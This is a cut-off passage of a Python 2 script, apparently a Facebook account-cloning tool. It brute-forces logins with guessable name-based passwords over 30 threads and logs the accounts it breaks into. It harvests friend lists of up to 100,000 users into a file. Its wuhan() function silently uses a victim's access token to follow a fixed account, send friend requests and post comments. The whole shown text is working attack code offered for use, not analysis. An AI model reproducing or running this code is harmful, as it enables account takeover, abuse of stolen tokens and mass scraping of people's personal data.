            b = rana.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[RANA-OK] "+uid + " | " + pass1
                ok=open('RANA-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;91m[RANA-CP] "+uid + " | " + pass1
                    cp=open('RANA-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                else:
                    pass2 = first+"123"
                    rana = requests.Session()
                    rana.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                    p = rana.get('https://m.facebook.com')
                    b = rana.post('https://m.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[RANA-OK] "+uid + " | " + pass2
                        ok=open('Rana-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                    else:
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;91m[RANA-CP] "+uid + " | " + pass2
                            cp=open('Rana-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                        else:
                            pass3 = first+"last"
                            rana = requests.Session()
                            rana.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                            p = rana.get('https://m.facebook.com')
                            b = rana.post('https://m.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[RANA-OK] "+uid + " | " + pass3
                                ok=open('Rana-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                            else:
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[RANA-CP] "+uid + " | " + pass3
                                    cp=open('Rana-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                else:
                                    pass4 = first+"12345"
                                    rana = requests.Session()
                                    rana.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                    p = rana.get('https://m.facebook.com')
                                    b = rana.post('https://m.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[RANA-OK] "+uid + " | " + pass4
                                        ok=open('Rana-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                    else:
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;91m[RANA-CP] "+uid + " | " + pass4
                                            cp=open('Rana-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                        else:
                                            pass5 = first+"786"
                                            rana = requests.Session()
                                            rana.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                            p = rana.get('https://m.facebook.com')
                                            b = rana.post('https://m.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[RANA-OK] "+uid + " | " + pass5
                                                ok=open('Rana-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                oks.append(uid+pass5)
                                            else:
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;91m[RANA-CP] "+uid + " | " + pass5
                                                    cp=open('Rana-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                            
                    
        except:
            pass
    
    p = ThreadPool(30)
    p.map(main, idx)
    print "\x1b[1;97m"
    print "\x1b[1;91m[!]\x1b[1;97m Cloning Complete Result ........"
    print("\x1b[1;97m------------------------------------------------")
    print '\x1b[1;91m[!]\x1b[1;97mTotal ok ids : '+str(len(cps))
    print '\x1b[1;91m[!]\x1b[1;97mTotal cp ids : '+str(len(oks))
    print("\x1b[1;97m------------------------------------------------")
    print ''
    raw_input(' Press enter to back ')
    menu3()
    
	

def yayanxd():
    os.system('clear')
    kontol = raw_input('\n%s[%sX%s] Enter Token :%s ' % (N, M, N, H))
    if kontol in ('fuck', 'Fuck', 'FUCK'):
        os.system('clear')
        print logo
        print '_____________________________________________________\n'
        raw_input(' \n%sX%s Enter Token : ' % (O, N))
        os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
        yayanxd()
    try:
        Name = requests.get('https://graph.facebook.com/me?access_token=%s' % kontol).json()['name']
        print '\n\n %sX%s Welcome To Fucking World %s%s%s' % (O, N, K, Name, N)
        time.sleep(2)
        open('.memek.txt', 'w').write(kontol)
        wuhan(kontol)
        os.system('xdg-open https://youtu.be/2NKmiCZSIAA')
        moch_yayan()
    except KeyError:
        print '\n  Invalid Token / ReLogin' 
        time.sleep(2)
        yayanxd()


def moch_yayan():
    os.system('clear')
    try:
        kontol = open('.rana.txt', 'r').read()
    except IOError:
        print '\n %s[%sO>%s] Login Page ...' % (N, M, N)
        time.sleep(2)
        os.system('rm -rf .rana.txt')
        yayanxd()

    try:
        Name = requests.get('https://graph.facebook.com/me?access_token=%s' % kontol).json()['name']
    except KeyError:
        print '\n %s[%>%s] Error Token  ' % (N, M, N)
        time.sleep(2)
        os.system('rm -rf .rana.txt')
        yayanxd()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] Connection Error\n' % (N, M, N))

    print logo
    IP = requests.get('http://ip-api.com/json').json()['query']
    time.sleep(0.03)
    print '\x1b[1;32;m\t\t Create File 100077/100078 For Ok ids \x1b[0m'
    print '\033[1;37;40m1.\x1b[0m] \tCreate File [5-Links]\x1b[0m'
    print '\033[1;37;40m2.\x1b[0m] \tCreate File [10-Links]\x1b[0m'
    print '\033[1;37;40m3.\x1b[0m] \tCreate File [20-Links]\x1b[0m'
    print '\033[1;37;40m4.\x1b[0m] \tSeperate [100077-100078-Ids]\x1b[0m'
    pepek = raw_input('\n [>] menu : ')
    if pepek == '':
        print '\n Please ! Fill Correctly!' 
        time.sleep(2)
        moch_yayan()
    elif pepek in ('1', '01'):
        publik(kontol)
    elif pepek in ('2', '02'):
        publik2(kontol)
    elif pepek in ('3', '03'):
        publik3(kontol)
    elif pepek in ('4', '04'):
        publik4(kontol)
    else:
    	print(' \n\033[1;31mWrong Input ')
    time.sleep(1)
    moch_yayan()

def wuhan(kontol):
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/100008362030140/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s' % (koh, kentod))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s' % (lo_ngentod, kentod, kentod))
    except:
        pass

def publik(kontol):
    try:
        os.mkdir('dump')
    except:
        pass

    try:
    	filePath = '/sdcard/rana-idz.txt';
        if os.path.exists(filePath):
        	os.remove(filePath)
        filePath = '/sdcard/rana-idz.txt';
        if os.path.exists(filePath):
        	os.remove(filePath)
        csy = raw_input('\n [1] Public Id  : ' )
        csy2 = raw_input('\n [2] Public Id  : ' )
        csy3 = raw_input('\n [3] Public Id  : ' )
        csy4 = raw_input('\n [4] Public Id  : ' )
        csy5 = raw_input('\n [5] Public Id  : ' )
        ihh = '20000'
        knt = ('/sdcard/rana-idz.txt')
        ys = open(knt, 'w')
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy2, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy3, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy4, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy5, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)

        ys.close()
        jalan('\n\n %s[%s\xe2\x9c\x93%s] Process Completed Ids Saved' % (N, H, N))
        print ' [%s\xe2\x80\xa2%s] Done Copy This File >  ( %s%s%s )' % (O, N, M, knt, N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] ' % (O, N))
        moch_yayan()
    except (KeyError, IOError):
        os.remove(knt)
        jalan('\n %s[%s!%s] Dump Failed.\n' % (N, M, N))
        raw_input(' [ %sBack%s ] ' % (O, N))
        moch_yayan()
        

def publik2(kontol):
    try:
        os.mkdir('dump')
    except:
        pass

    try:
    	filePath = '/sdcard/rana-idz.txt';
        if os.path.exists(filePath):
        	os.remove(filePath)
        filePath = '/sdcard/rana-idz.txt';
        if os.path.exists(filePath):
        	os.remove(filePath)
        csy = raw_input('\n [1] Public Id  : ' )
        csy2 = raw_input('\n [2] Public Id  : ' )
        csy3 = raw_input('\n [3] Public Id  : ' )
        csy4 = raw_input('\n [4] Public Id  : ' )
        csy5 = raw_input('\n [5] Public Id  : ' )
        csy6 = raw_input('\n [6] Public Id  : ' )
        csy7 = raw_input('\n [7] Public Id  : ' )
        csy8 = raw_input('\n [8] Public Id  : ' )
        csy9 = raw_input('\n [9] Public Id  : ' )
        csy10 = raw_input('\n [10] Public Id  : ' )
        ihh = '50000'
        knt = ('/sdcard/rana-idz.txt')
        ys = open(knt, 'w')
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy2, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy3, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy4, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy5, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy6, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy7, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy8, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy9, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy10, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)            

        ys.close()
        jalan('\n\n %s[%s\xe2\x9c\x93%s] Process Completed Ids Saved' % (N, H, N))
        print ' [%s\xe2\x80\xa2%s] Done Copy This File >  ( %s%s%s )' % (O, N, M, knt, N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] ' % (O, N))
        moch_yayan()
    except (KeyError, IOError):
        os.remove(knt)
        jalan('\n %s[%s!%s] Dump Failed.\n' % (N, M, N))
        raw_input(' [ %sBack%s ] ' % (O, N))
        moch_yayan()
        
def publik3(kontol):
    try:
        os.mkdir('dump')
    except:
        pass

    try:
    	filePath = '/sdcard/rana-idz.txt';
        if os.path.exists(filePath):
        	os.remove(filePath)
        filePath = '/sdcard/rana-idz.txt';
        if os.path.exists(filePath):
        	os.remove(filePath)
        csy = raw_input('\n [1] Public Id  : ' )
        csy2 = raw_input('\n [2] Public Id  : ' )
        csy3 = raw_input('\n [3] Public Id  : ' )
        csy4 = raw_input('\n [4] Public Id  : ' )
        csy5 = raw_input('\n [5] Public Id  : ' )
        csy6 = raw_input('\n [6] Public Id  : ' )
        csy7 = raw_input('\n [7] Public Id  : ' )
        csy8 = raw_input('\n [8] Public Id  : ' )
        csy9 = raw_input('\n [9] Public Id  : ' )
        csy10 = raw_input('\n [10] Public Id  : ' )
        csy11 = raw_input('\n [11] Public Id  : ' )
        csy12 = raw_input('\n [12] Public Id  : ' )
        csy13 = raw_input('\n [13] Public Id  : ' )
        csy14 = raw_input('\n [14] Public Id  : ' )
        csy15 = raw_input('\n [15] Public Id  : ' )
        csy16 = raw_input('\n [16] Public Id  : ' )
        csy17 = raw_input('\n [17] Public Id  : ' )
        csy18 = raw_input('\n [18] Public Id  : ' )
        csy19 = raw_input('\n [19] Public Id  : ' )
        csy20 = raw_input('\n [20] Public Id  : ' )
        ihh = '100000'
        knt = ('/sdcard/rana-idz.txt')
        ys = open(knt, 'w')
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy2, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy3, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy4, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy5, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy6, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy7, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy8, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy9, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy10, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)       
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy11, ihh, kontol)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
